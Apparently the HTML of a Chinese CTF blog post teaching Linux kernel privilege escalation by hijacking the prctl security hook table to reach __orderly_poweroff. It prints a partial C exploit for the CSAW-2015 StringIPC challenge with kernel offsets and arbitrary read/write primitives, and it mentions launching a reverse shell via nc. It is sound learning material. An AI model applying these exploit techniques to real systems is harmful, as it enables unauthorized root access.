@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="Prctl是linux的一个函数，可以对进程、线程做一些设置，prctl内部通过虚表来调用对应的功能，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，且以root权限执行，由此可以利用起来提权。 我们分析一下prctl源码，在linux&#x2F;kernel&#x2F;sys.c里，我们看到这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux kernel pwn学习之hijack prctl">
+<meta property="og:url" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="Prctl是linux的一个函数，可以对进程、线程做一些设置，prctl内部通过虚表来调用对应的功能，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，且以root权限执行，由此可以利用起来提权。 我们分析一下prctl源码，在linux&#x2F;kernel&#x2F;sys.c里，我们看到这">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image2.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image3.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image4.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image5.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image6.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image7.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image8.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image9.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image10.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image11.png">
+<meta property="og:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image12.JPG">
+<meta property="article:published_time" content="2020-03-06T06:25:11.000Z">
+<meta property="article:modified_time" content="2025-06-26T04:00:11.003Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="堆溢出">
+<meta property="article:tag" content="Linux Kernel">
+<meta property="article:tag" content="Linux内核堆">
+<meta property="article:tag" content="hijack prctl">
+<meta property="article:tag" content="modprobe_path">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>linux kernel pwn学习之hijack prctl | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          linux kernel pwn学习之hijack prctl
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-06 14:25:11" itemprop="dateCreated datePublished" datetime="2020-03-06T14:25:11+08:00">2020-03-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 12:00:11" itemprop="dateModified" datetime="2025-06-26T12:00:11+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Prctl是linux的一个函数，可以对进程、线程做一些设置，<strong>prctl内部通过虚表来调用对应的功能</strong>，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，<strong>且以root权限执行，由此可以利用起来提权。</strong></p>
+<p>我们分析一下prctl源码，在linux&#x2F;kernel&#x2F;sys.c里，我们看到这</p>
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image1.JPG" class="">
+
+<p>我们继续跟进，查看security_task_prctl函数，在linux&#x2F;security&#x2F;security.c文件里找到</p>
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image2.JPG" class="">
+
+<p>函数调用了task_prctl表里的函数，因此，如果我们劫持task_prctl表，就能通过执行prctl来执行我们想要的函数，比如call_usermodehelper函数。为了确定我们该劫持的表的地址，我们先写一个小demo.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">   prctl(<span class="number">0</span>,<span class="number">0</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>然后，编译，放到系统里，我们先查看一下security_task_prctl函数的地址</p>
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image3.JPG" class="">
+
+<p>接下来，我们用gdb在这里断点，然后运行我们的demo程序</p>
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image4.JPG" class="">
+
+<p>成功断点</p>
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image5.png" class="">
+
+<p>继续单步运行，到这里</p>
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image6.JPG" class="">
+
+<p>从而，我们确定了task_prctl表的地址，减去内核基地址，我们就能确定task_prctl的偏移了。在这里，我们得到的是偏移是0xeb8118。</p>
+<p>有一点不幸的是, 传入security_task_prctl函数的第一个参数被截断了，这意味着，如果我们<strong>把task_prctl劫持为call_usermodehelper，在64位下不能完成利用。</strong></p>
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image7.JPG" class="">
+
+<p>因为call_usermodehelper函数的第一个参数是一个字符串地址</p>
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image8.JPG" class="">
+
+<p>为了解决这个问题，我们可以借鉴一下glibc下劫持为one_gadget的思想，我们来搜索一下有没有类似的one_gadget可以使用。我们在内核源码里搜索哪些函数调用了call_usermodehelper函数。</p>
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image9.JPG" class="">
+
+<p>我们发现mce_do_trigger函数可以用，它调用call_usermodehelper函数的前两个参数来自全局数据段，或许可以被我们劫持修改</p>
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image10.JPG" class="">
+
+<p>我们有找到几个合适的</p>
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image11.png" class="">
+
+<p>其中run_cmd调用了call_usermodehelper函数。由此，**我们只需要把prctl_task劫持到这几个函数，比如__orderly_poweroff，然后篡改poweroff_cmd为我们需要执行的二进制文件路径。接着调用prctl，就会以root权限执行我们的二进制文件，从而提权。**我们可以执行一个反弹shell的程序，然后用nc来连接。</p>
+<p>为了实现上述目标，我们首先需要得到内核基址，之前，我在<a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104694219">https://blog.csdn.net/seaaseesa/article/details/104694219</a>这篇博客里讲到了劫持vdso，我们同样需要利用一下，我们计算出了vdso的地址后，就能算出内核的基址，因为它们之间的差值是不变的。</p>
+<p>我们以CSAW-2015-StringIPC为例，它的exploit.c如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/auxv.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_IOCTL_BASE     0x77617363  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8  </span></span><br><span class="line"><span class="comment">//poweroff字符串的偏移  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POWEROFF_CMD 0xE4DFA0  </span></span><br><span class="line"><span class="comment">//orderly_poweroff函数的偏移  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORDERLY_POWEROFF 0x9c950  </span></span><br><span class="line"><span class="comment">//task_prctl的偏移  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_PRCTL 0xeb8118;  </span></span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span>  </span><br><span class="line">    <span class="type">size_t</span> buf_size;  </span><br><span class="line">    <span class="type">int</span> id;  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span>  </span><br><span class="line">    <span class="type">int</span> id;  </span><br><span class="line">    <span class="type">size_t</span> size;  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span>  </span><br><span class="line">    <span class="type">int</span> id;  </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">    <span class="type">size_t</span> count;  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span>  </span><br><span class="line">    <span class="type">int</span> id;  </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">    <span class="type">size_t</span> count;  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span>  </span><br><span class="line">    <span class="type">int</span> id;  </span><br><span class="line">    <span class="type">loff_t</span> index;  </span><br><span class="line">    <span class="type">int</span> whence;  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span> &#123;  </span><br><span class="line">   <span class="built_in">puts</span>(msg);  </span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">-1</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//驱动的文件描述符  </span></span><br><span class="line"><span class="type">int</span> fd;  </span><br><span class="line"><span class="comment">//初始化驱动  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initFD</span><span class="params">()</span> &#123;  </span><br><span class="line">   fd = open(<span class="string">&quot;/dev/csaw&quot;</span>,O_RDWR);  </span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">      errExit(<span class="string">&quot;[-] open file error!!&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//申请一个channel,返回id  </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_channel</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">args</span>;</span>  </span><br><span class="line">   args.buf_size = size;  </span><br><span class="line">   args.id = <span class="number">-1</span>;  </span><br><span class="line">   ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;args);  </span><br><span class="line">   <span class="keyword">if</span> (args.id == <span class="number">-1</span>) &#123;  </span><br><span class="line">      errExit(<span class="string">&quot;[-]alloc_channel error!!&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">return</span> args.id;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//改变channel的大小  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shrink_channel</span><span class="params">(<span class="type">int</span> id,<span class="type">size_t</span> size)</span> &#123;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">args</span>;</span>  </span><br><span class="line">   args.id = id;  </span><br><span class="line">   args.size = size;  </span><br><span class="line">   ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;args);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//seek  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">seek_channel</span><span class="params">(<span class="type">int</span> id,<span class="type">loff_t</span> offset,<span class="type">int</span> whence)</span> &#123;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">args</span>;</span>  </span><br><span class="line">   args.id = id;  </span><br><span class="line">   args.index = offset;  </span><br><span class="line">   args.whence = whence;  </span><br><span class="line">   ioctl(fd,CSAW_SEEK_CHANNEL,&amp;args);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//读取数据  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_channel</span><span class="params">(<span class="type">int</span> id,<span class="type">char</span> *buf,<span class="type">size_t</span> count)</span> &#123;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">args</span>;</span>  </span><br><span class="line">   args.id = id;  </span><br><span class="line">   args.buf = buf;  </span><br><span class="line">   args.count = count;  </span><br><span class="line">   ioctl(fd,CSAW_READ_CHANNEL,&amp;args);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//写数据  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_channel</span><span class="params">(<span class="type">int</span> id,<span class="type">char</span> *buf,<span class="type">size_t</span> count)</span> &#123;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">args</span>;</span>  </span><br><span class="line">   args.id = id;  </span><br><span class="line">   args.buf = buf;  </span><br><span class="line">   args.count = count;  </span><br><span class="line">   ioctl(fd,CSAW_WRITE_CHANNEL,&amp;args);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//任意地址读  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_read</span><span class="params">(<span class="type">int</span> id,<span class="type">char</span> *buf,<span class="type">size_t</span> addr,<span class="type">size_t</span> count)</span> &#123;  </span><br><span class="line">   seek_channel(id,addr<span class="number">-0x10</span>,SEEK_SET);  </span><br><span class="line">   read_channel(id,buf,count);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//任意地址写  </span></span><br><span class="line"><span class="comment">//由于题目中使用了strncpy_from_user,遇到0就会截断，因此，我们逐字节写入  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_write</span><span class="params">(<span class="type">int</span> id,<span class="type">char</span> *buf,<span class="type">size_t</span> addr,<span class="type">size_t</span> count)</span> &#123;  </span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;count;i++) &#123;  </span><br><span class="line">      seek_channel(id,addr+i<span class="number">-0x10</span>,SEEK_SET);  </span><br><span class="line">      write_channel(id,buf+i,<span class="number">1</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//获取vdso里的字符串&quot;gettimeofday&quot;相对vdso.so的偏移  </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_gettimeofday_str_offset</span><span class="params">()</span> &#123;  </span><br><span class="line">   <span class="comment">//获取当前程序的vdso.so加载地址0x7ffxxxxxxxx  </span></span><br><span class="line">   <span class="type">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);  </span><br><span class="line">   <span class="type">char</span>* name = <span class="string">&quot;gettimeofday&quot;</span>;  </span><br><span class="line">   <span class="keyword">if</span> (!vdso_addr) &#123;  </span><br><span class="line">      errExit(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="comment">//仅需要搜索1页大小即可，因为vdso映射就一页0x1000  </span></span><br><span class="line">   <span class="type">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));  </span><br><span class="line">   <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">      errExit(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">return</span> name_addr - vdso_addr;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">   <span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000</span>);  </span><br><span class="line">   initFD();  </span><br><span class="line">   <span class="comment">//申请一个channel，大小0x100  </span></span><br><span class="line">   <span class="type">int</span> id = alloc_channel(<span class="number">0x100</span>);  </span><br><span class="line">   <span class="comment">//改变channel大小，形成漏洞,实现任意地址读写  </span></span><br><span class="line">   